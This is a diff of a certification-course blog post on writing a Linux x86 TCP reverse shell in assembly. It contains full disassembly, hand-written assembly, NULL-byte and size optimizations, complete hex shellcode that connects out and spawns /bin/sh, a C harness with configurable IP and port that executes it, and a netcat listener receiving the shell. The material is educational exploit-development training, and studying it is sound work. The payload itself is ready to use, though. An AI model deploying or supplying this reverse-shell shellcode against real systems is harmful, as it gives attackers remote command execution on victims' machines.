@@ -6,7 +6,6 @@ tags: [slae, osce]
 fullview: false
 comments: true
 ---
-
 # Assignment #2: Reverse Shell TCP
 > This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
 > http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
@@ -135,7 +134,7 @@ $ objdump -d ./client -M intel
  69d:	53                   	push   ebx
  69e:	51                   	push   ecx
  69f:	83 ec 20             	sub    esp,0x20
- 6a2:	e8 b9 fe ff ff       	call   560 <__x86.get_pc_thunk.bx>
+ 6a2:	e8 b9 fe ff ff       	call   560 <\__x86.get_pc_thunk.bx>
  6a7:	81 c3 59 19 00 00    	add    ebx,0x1959
  6ad:	83 ec 0c             	sub    esp,0xc
  6b0:	8d 83 e0 e7 ff ff    	lea    eax,[ebx-0x1820]
@@ -204,7 +203,9 @@ We can extract the opcodes using this one-liner:
 
 Piping this into *wc -c* shows how many bytes this shellcode has:
 
-    3463
+    865
+
+In order to reduce the size of this shellcode we must code it by hand.
 
 ## Handcrafted shellcode
 
@@ -341,20 +342,18 @@ The rest of the code was simple:
  ;dup2(sock, 2);
  
  mov eax, 0x3f ;dup2
- mov ecx, edi
- mov ebx, 0x0
+ mov ebx, edi
+ xor ecx, ecx
+
+ int 0x80
+ 
+ mov eax, 0x3f ;dup2
+ mov ecx, 0x1
  
  int 0x80
  
  mov eax, 0x3f ;dup2
- mov ebx, 0x1
- mov ecx, edi
- 
- int 0x80
- 
- mov eax, 0x3f ;dup2
- mov ebx, 0x2
- mov ecx, edi
+ mov ecx, 0x2
  
  int 0x80
  
@@ -378,16 +377,76 @@ The rest of the code was simple:
 Extracting the opcodes:
 
 ```
-objdump -d ./rev|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x68\x7f\x01\x01\x01\x66\x68\x22\xb8\x66\x6a\x02\x89\xe6\x31\xc0\xb8\x66\x00\x00\x00\x31\xdb\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb8\x3f\x00\x00\x00\x89\xf9\xbb\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xf9\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x02\x00\x00\x00\x89\xf9\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
+objdump -d ./rev|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed   's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x68\x7f\x01\x01\x01\x66\x68\x22\xb8\x66\x6a\x02\x89\xe6\x31\xc0\xb8\x66\x00\x00\x00\x31\xdb\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb8\x3f\x00\x00\x00\xb9\x00\x00\x00\x00\x89\xfb\xcd\x80\xb8\x3f\x00\x00\x00\xb9\x01\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\xb9\x02\x00\x00\x00\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
+```
+So we got to a shellcode of 119 bytes! Great, but it is still large and has multiple **NULL bytes**. Can we do better?
+
+## Optimizing the shellcode (a little)
+First thing is to use the PUSH-POP technique to initialize a register with some value. Instead of XORing eax with itself and then moving a byte to al, we can push the byte into the stack and then pop it into eax.
+
+For opening the socket we use:
+
+```
+xor eax, eax
+mov al, 0x66 ;socketcall
 ```
 
-Using the [test skelleton code](https://marcosvalle.github.io/osce/2018/05/03/testing-shellcode.html):
+Now this becomes:
 
 ```
-#include<stdio.h>
- 
-char *shellcode = "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x68\x7f\x01\x01\x01\x66\x68\x22\xb8\x66\x6a\x02\x89\xe6\x31\xc0\xb8\x66\x00\x00\x00\x31\xdb\xbb\x03\x00\x00\x00\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb8\x3f\x00\x00\x00\x89\xf9\xbb\x00\x00\x00\x00\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xf9\xcd\x80\xb8\x3f\x00\x00\x00\xbb\x02\x00\x00\x00\x89\xf9\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80"; 
+push byte 0x66
+pop eax
+```
+
+It has the same effect but 1 byte smaller. We apply this same idea multiple times.
+
+Another optimization is changing this:
+
+```
+xor ebx, ebx
+mov bl, 0x01 ;socket function
+
+;push the list of arguments onto the stack
+push 0x00 ;PROT
+push 0x01 ;SOCK_STREAM
+push 0x02 ;AF_INET
+```
+
+To this:
+
+```
+xor ebx, ebx
+
+;push the list of arguments onto the stack
+push ebx ;ebx=0 (PROT)
+inc ebx
+push ebx ; ebx=1 (SOCK_STREAM)
+inc ebx
+push ebx ;ebx=2 (AF_INET)
+
+dec ebx ;ebx=1
+```
+
+This will reduce the size of the payload while eliminating one NULL byte. The final result is a **92 bytes** shellcode! Still not the best, but much better :)
+
+You can find the complete code with 92 bytes [here](https://github.com/marcosValle/SLAE/blob/master/assignment2/reverseShellOpt.asm). The 119 bytes (with NULLs) version is [here](https://github.com/marcosValle/SLAE/blob/master/assignment2/reverseShell.asm)
+
+## Testing
+Using the [test skelleton code](https://marcosvalle.github.io/osce/2018/05/03/testing-shellcode.html) slightly modified so the port and the IP address are configurable:
+
+```
+#include <stdio.h>
+
+/*
+ ipaddr 127.1.1.1 (0101017f)
+ port 8888 (b822)
+*/
+#define IPADDR "\x7f\x01\x01\x01"
+#define PORT "\x22\xb8"
+
+unsigned char *shellcode ="\x6a\x66\x58\x31\xdb\x53\x43\x53\x43\x53\x4b\x89\xe1\xcd\x80\x89\xc7\x68"IPADDR"\x66\x68"PORT"\x66\x6a\x02\x89\xe6\x6a\x66\x58\x6a\x03\x5b\x6a\x10\x56\x57\x89\xe1\xcd\x80\x6a\x3f\x58\x89\xfb\x31\xc9\xcd\x80\x6a\x3f\x58\x6a\x01\x59\xcd\x80\x6a\x3f\x58\x41\xcd\x80\x6a\x0b\x58\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
+
  
  int main(){
      int (*ret)();
@@ -395,23 +454,17 @@ char *shellcode = "\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x00\x6a\x01\x6a\x02\x89\
      ret();
  
      return 0;
- }
+}
 ```
 
-And now:
+Setting up a listener in another Terminal:
+
+	$ nc -nlvp 8888
+
+And now running `./test`:
 
 ```
-$ ./test 
-$ whoami
-SLAE-user
+$ nc -nlvp 8888
+whoami
+valle
 ```
-
-## Configurable parameters (IP and port)
-
-We are almost done but changing the IP address and the port is still not user-friendly (at all). A common solution to this problem is to create a wrapper code that modifies our shellcode according to the user defined parameters. I picked python3 to accomplish this task.
-
-```
-
-```
-
-You can find the complete code with 123 bytes [here](https://github.com/marcosValle).
